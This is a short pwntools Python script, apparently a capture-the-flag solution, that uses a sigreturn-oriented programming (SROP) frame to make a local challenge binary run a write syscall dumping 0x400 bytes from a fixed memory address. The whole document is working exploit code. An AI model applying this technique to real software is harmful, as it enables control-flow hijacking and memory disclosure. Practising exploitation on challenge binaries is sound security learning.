from pwn import *

target = process('./funsignals_player_bin')

# Specify the architecture
context.arch = "amd64"

frame = SigreturnFrame()

# Specify rip to point to the syscall instruction
frame.rip = 0x1000000b

# Prep the registers for a write syscall
frame.rax = 0x1
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x400

# Send the sigreturn frame
target.send(str(frame))

target.interactive()